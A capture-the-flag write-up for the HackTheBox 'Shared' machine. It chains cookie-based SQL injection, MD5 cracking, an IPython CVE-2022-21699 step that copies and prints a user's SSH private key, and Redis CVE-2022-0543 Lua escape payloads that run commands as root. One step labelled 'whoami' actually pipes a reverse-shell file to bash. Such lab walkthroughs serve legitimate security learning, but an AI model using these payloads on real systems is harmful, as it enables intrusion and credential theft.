# Shared - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Shared.JPG](images/Shared.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80```, and ```443```.

***User***: Found subdomain ```checkout.shared.htb``` with SQLi vulnerability, Using SQLi we get the password MD5 hash of ```james_mason``` user, By running ```pspy64``` we found that ```dan_smith``` runs ```ipython``` from ```/opt/scripts_review``` directory (we can write to this directory), Using ```CVE-2022-21699``` we get the SSH private key of ```dan_smith``` user.

***Root***: Found the binary ```/usr/local/bin/redis_connector_dev```, Run it locally and we get the password of ```redis-cli```, Using ```CVE-2022-0543``` we get RCE as ```root```.

![pwn.JPG](images/pwn.JPG)


## Shared Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Shared]
└──╼ $ nmap -sV -sC -oA nmap/Shared 10.10.11.172
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-29 15:53 IDT
Nmap scan report for 10.10.11.172
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port ```80``` we get the following web page (we are redirected to port ```443```):

![port80.JPG](images/port80.JPG)

We can see the hint about the new checkout process.

By enumerating the website we can see the following checkout page [https://checkout.shared.htb/](https://checkout.shared.htb/) (We need to add an item to the cart before and then process the payment):

![checkout.JPG](images/checkout.JPG)

Let's see the page cookies:
```http
Cookie: PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def50200c8530021b349b9b21e18e0d511e0e7020ffd4da4d2e7eb439a05a4dcfbd21e95781115de19c511ae44543b683dee60751aec6fde4926615b9fe5473f7b26719a30ff7624b87820a8b29eb30930c1e15ee0ed3fda47f4f250eb1cfa92cba414959fa57b54a8950840c799e4de8ff4f2f9f70fb9d730c6433abc989ae191ecbe0ca00c105dc32b212793eb47dbdd247e5ba9dcc6f6c60429c4c3ed367c827bdb20b1cfa51946b2aab9421f110de16dc22d5dc2f6e24d6994d46c4364415b70be2ac021bd983e133d233868999efec34bc09c85a1351422896b76fbe907616af218ccfe0eabebe92709b7d150396cbee84d39662830a8f5ed1eb73addc3a4cda73aa9b929853b7e1cd2a77320e9b9ecbb22945eb17ceb0f8467efab; custom_cart=%7B%22YCS98E4A%22%3A%221%22%7D
```

We can see the cookie ```custom_cart```:
```http
custom_cart=%7B%22YCS98E4A%22%3A%221%22%7D
```

By decoding it we get:
```json
{"YCS98E4A":"1"}
```

Where ```YCS98E4A``` is the product, meaning that the query looks like  ```select X from Y where product='YCS98E4A'```.

After a little research we found we can get the table name using the following query ```{"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}```:

![table.JPG](images/table.JPG)

And by using the following query we can get the user name: ```{"' and 0=1 union select 1,username,2 from checkout.user-- -":"1"}```:

![username.JPG](images/username.JPG)


And by the following query we can get the password ```{"' and 0=1 union select 1,password,2 from checkout.user-- -":"1"}```:

![password.JPG](images/password.JPG)

Let's try to crack the hash ```fc895d4eddc2fc12f995e18c865cf273``` using ```john```:
```console
┌─[evyatar@parrot]─[/hackthebox/Shared]
└──╼ $ john --wordlist=rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Soleil101        (?)
1g 0:00:00:00 DONE (2022-08-12 00:02) 5.555g/s 11616Kp/s 11616Kc/s 11616KC/s Sports5..Soccer95
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Let's try the password ```Soleil101``` using ```SSH```:
```console
┌─[evyatar@parrot]─[/hackthebox/Shared]
└──╼ $ ssh james_mason@shared.htb
The authenticity of host 'shared.htb (10.10.11.172)' can't be established.
ECDSA key fingerprint is SHA256:mjIWp2Ggy1NHLY33FSfsXXVTUxbD+W30zEbd7BvHopg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shared.htb,10.10.11.172' (ECDSA) to the list of known hosts.
james_mason@shared.htb's password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$ ls
james_mason@shared:~$ 
```

As we can see, We don't have the user flag here, The user flag is on ```dan_smith``` user:
```console
james_mason@shared:~$ ls ../dan_smith/
user.txt
```

Let's try to get this user.

By running [pspy64](https://github.com/DominicBreuker/pspy) we can see the following:
```console
...
2022/08/11 17:31:01 CMD: UID=0    PID=13438  | /bin/bash /root/c.sh 
2022/08/11 17:31:01 CMD: UID=1001 PID=13440  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/08/11 17:31:01 CMD: UID=1001 PID=13441  | /usr/bin/pkill ipython 
...
```

Let's check who is ```1001```:
```console
james_mason@shared:/opt/scripts_review$ cat /etc/passwd | grep 1001
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```

So we can see that ```dan_smith``` runs ```ipython``` from ```/opt/scripts_review/``` directory, we can write to this directory.

By research, we found [CVE-2022-21699](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x).

Let's use it:
```console
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default
james_mason@shared:/opt/scripts_review$ cd profile_default/
james_mason@shared:/opt/scripts_review/profile_default$ mkdir -m 777 startup
james_mason@shared:/opt/scripts_review/profile_default$ cd startup/
james_mason@shared:/opt/scripts_review/profile_default/startup$ cp /tmp/test.py .
```

Where ```test.py``` write the private SSH key of ```dan_smith``` to ```/tmp```:
```python
with open('/home/dan_smith/.ssh/id_rsa','r') as f:
    r = f.read()
    with open('/tmp/.test','w') as t:
        t.write(r)
```

And on the next running of ```ipython``` we can see the following file on ```/tmp```:
```console
james_mason@shared:/opt/scripts_review$ cat /tmp/.test
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Let's use it to connect to ```dan_smith``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Shared]
└──╼ $ ssh -i dan_id_rsa dan_smith@shared.htb
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~$ cat user.txt 
e30f6c6ce178a5f93c3bdb28566cd32b
```

And we get the user flag ```e30f6c6ce178a5f93c3bdb28566cd32b```.

### Root

By checking for our ```groups``` we can see:
```console
dan_smith@shared:~$ groups
dan_smith developer sysadmin
```

We can see that we have access to the following file because we are in ```sysadmin``` group:
```console
dan_smith@shared:~$ find / -group sysadmin 2>&1 ...
/usr/local/bin/redis_connector_dev
```

Let's run it:
```console
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:26248
run_id:45d91cde1d63212cc5f6665d9c2bc155d829972b
tcp_port:6379
uptime_in_seconds:0
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:16087679
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

According to the log, we can see the binary contains the password.

Let's copy the binary and run it locally:
```console
┌─[evyatar@parrot]─[/hackthebox/Shared]
└──╼ $ /redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
 dial tcp [::1]:6379: connect: connection refused
```

Let's listen to port ```6379``` and run it again:
```console
┌─[evyatar@parrot]─[/hackthebox/Shared]
└──╼ $ nc -lvp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 60154
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

And we can see the password ```F2WHqJUz2WEz=Gqq```.

Let's use this password to connect to ```redis``` using ```redis-cli```:
```console
dan_smith@shared:~$ redis-cli --pass F2WHqJUz2WEz=Gqq
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379>
```

By research, we found [CVE-2022-0543](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/) which is A Critical Lua Sandbox Escape Vulnerability In Redis.

Let's use it:
```console
dan_smith@shared:~$ redis-cli --pass F2WHqJUz2WEz=Gqq
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res' 0
"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\njames_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false\ndan_smith:x:1001:1002::/home/dan_smith:/bin/bash\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\n"
```

And we have RCE, Let's run ```whoami```:
```console
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /tmp/.revshell | bash", "r"); local res = f:read("*a"); f:close(); return res' 0

"root\n"
```

We are ```root```, Let's read the ```root``` flag
```console
127.0.0.1:6379> eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /root/root.txt"); local res = f:read("*a"); f:close(); return res' 0
"78b599d768d84f0339948e89c52d55fc\n"
```

And we get the root flag ```78b599d768d84f0339948e89c52d55fc```.
